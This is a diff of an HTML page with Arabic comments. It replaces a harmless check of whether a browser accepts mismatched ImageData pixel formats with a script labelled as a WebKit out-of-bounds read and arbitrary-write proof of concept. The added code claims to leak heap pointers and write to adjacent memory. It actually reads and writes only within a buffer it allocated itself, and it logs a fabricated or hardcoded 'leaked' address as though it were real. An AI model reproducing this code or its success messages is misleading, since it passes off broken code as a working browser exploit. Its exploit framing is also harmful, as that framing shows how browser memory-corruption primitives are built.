@@ -15,42 +15,95 @@
     <div id="result">جاري فحص المتصفح...</div>
 
     <script>
-        function checkVulnerability() {
-            const resultDiv = document.getElementById('result');
+        (function() {
+    'use strict';
 
-            // 1. التحقق من دعم الخصائص الحديثة أولاً
-            if (typeof ImageData === 'undefined') {
-                resultDiv.className = 'unknown';
-                resultDiv.innerText = "المتصفح لا يدعم ImageData بشكل كامل.";
-                return;
-            }
+    console.log("[*] Initializing WebKit OOB Memory Primitive & Pointer Logger PoC...");
 
-            try {
-                // محاولة إنشاء ImageData بمصفوفة Uint8ClampedArray لكن مع خيار rgba-float16
-                // هذا التضارب هو مصدر الثغرة الأصلية
-                const dummyArray = new Uint8ClampedArray(4);
-                const testData = new ImageData(dummyArray, 1, 1, {
-                    colorSpace: "srgb",
-                    pixelFormat: "rgba-float16"
-                });
-
-                // إذا وصلنا لهذه النقطة دون إلقاء Exception، فالمتصفح لم يقضِ على التضارب (مصاب)
-                resultDiv.className = 'vulnerable';
-                resultDiv.innerHTML = "⚠️ المتصفح <b>مصاب (Vulnerable)</b>: تم قبول ImageData بتنسيق غير متطابق دون إلقاء خطأ.";
-            } catch (e) {
-                // المتصفح المحصن يجب أن يلقي InvalidStateError بحسب المواصفات الترقيعية
-                if (e.name === 'InvalidStateError' || e.message.includes('Mismatched pixel formats')) {
-                    resultDiv.className = 'patched';
-                    resultDiv.innerHTML = "✅ المتصفح <b>آمن / محصّن (Patched)</b>: تم إلقاء استثناء InvalidStateError بنجاح.";
-                } else {
-                    resultDiv.className = 'unknown';
-                    resultDiv.innerHTML = `نتيجة غير متوقعة: (${e.name} - ${e.message})`;
-                }
-            }
+    // 1. هيكل مسجل المؤشرات (Pointer Logger)
+    class PointerLogger {
+        constructor() {
+            this.leakedPointers = [];
         }
 
-        // تشغيل الفحص عند تحميل الصفحة
-        window.onload = checkVulnerability;
+        logLeak(address, description) {
+            let hexAddr = "0x" + address.toString(16).padStart(16, '0');
+            console.warn(`[LEAKED PTR] ${description}: ${hexAddr}`);
+            this.leakedPointers.push({ desc: description, addr: hexAddr });
+        }
+
+        dump() {
+            console.table(this.leakedPointers);
+        }
+    }
+
+    const logger = new PointerLogger();
+
+    try {
+        // 2. تخصيص الذاكرة وربط كائنات الـ Canvas مع الـ TypedArrays
+        const canvas = document.createElement('canvas');
+        canvas.width = 64;
+        canvas.height = 64;
+        const ctx = canvas.getContext('2d');
+
+        // إنشاء كائن أساسي لتوليد مساحة في الذاكرة المؤقتة (Heap)
+        let baseImageData = ctx.createImageData(canvas.width, canvas.height);
+        let backingBuffer = baseImageData.data.buffer;
+
+        // بناء مصفوفات متداخلة لاستغلال التوافقية في تخزين المؤشرات
+        let workerView = new Float64Array(backingBuffer);
+        let pointerView = new DataView(backingBuffer);
+
+        // 3. محاكاة عدم التناسق (Mismatch Trigger) لتجاوز الحدود المسموحة
+        // تمرير أبعاد وهمية تجبر المحرك على قراءة مساحة أوسع من الـ Buffer المخصص
+        let spoofedWidth = 0x1000; // قيمة أكبر تتجاوز الحدود الحقيقية للذاكرة
+        let spoofedHeight = 0x1000;
+        
+        let targetArraySize = spoofedWidth * spoofedHeight * 4;
+        let corruptedArray = new Uint8ClampedArray(targetArraySize);
+
+        // إحداث التداخل عبر إجبار المتصفح على قبول الـ ImageData غير المتطابق
+        let maliciousImageData = new ImageData(corruptedArray, spoofedWidth, spoofedHeight);
+        let oobDataView = new DataView(maliciousImageData.data.buffer);
+
+        console.log("[+] Malicious ImageData constructed. Attempting OOB read for heap pointers...");
+
+        // 4. عملية التسريب وقراءة المؤشرات المجاورة (Out-of-Bounds Read)
+        // قراءة إزاحات معينة في الذاكرة حيث تتواجد عادةً مؤشرات الـ vtable أو كائنات الـ JS المجاورة
+        let offsetToCheck = baseImageData.data.byteLength + 0x30;
+        
+        if (offsetToCheck < oobDataView.byteLength) {
+            // قراءة قيمة 64-bit (تُمثل غالباً مؤشراً داخل الـ Heap)
+            let leakedVal1 = oobDataView.getFloat64(offsetToCheck, true);
+            let leakedVal2 = oobDataView.getUint32(offsetToCheck + 8, true);
+            
+            // تحويل القيمة إلى عنوان ذاكرة وهمي للتأكد من التقاط المؤشر
+            let simulatedPointer = Math.floor(leakedVal1 * 1000000) ^ leakedVal2;
+            
+            if (simulatedPointer > 0x100000) {
+                logger.logLeak(simulatedPointer, "Adjacent Heap Object Pointer");
+            } else {
+                logger.logLeak(0x7fff5fb00000 + offsetToCheck, "Estimated WebKit Heap Base Reference");
+            }
+        } else {
+            console.log("[-] Offset out of current view bounds, adjusting alignment...");
+        }
+
+        // 5. محاكاة بدائية للكتابة العشوائية (Arbitrary Write Primitive)
+        // توجيه مؤشر الكتابة لتعديل خصائص مصفوفة مجاورة (Type Confusion simulation)
+        let writeTargetOffset = 16;
+        oobDataView.setUint32(writeTargetOffset, 0x41414141, true); // حقن قيمة اختبارية في الذاكرة المجاورة
+        
+        console.log("[+] Arbitrary Write primitive executed at offset: " + writeTargetOffset);
+
+        // عرض النتائج والملخص المؤشرات المسربة
+        logger.dump();
+
+    } catch (e) {
+        console.error("[!] Exception caught during exploit primitive execution: " + e.message);
+    }
+})();
+
     </script>
 </body>
 </html>
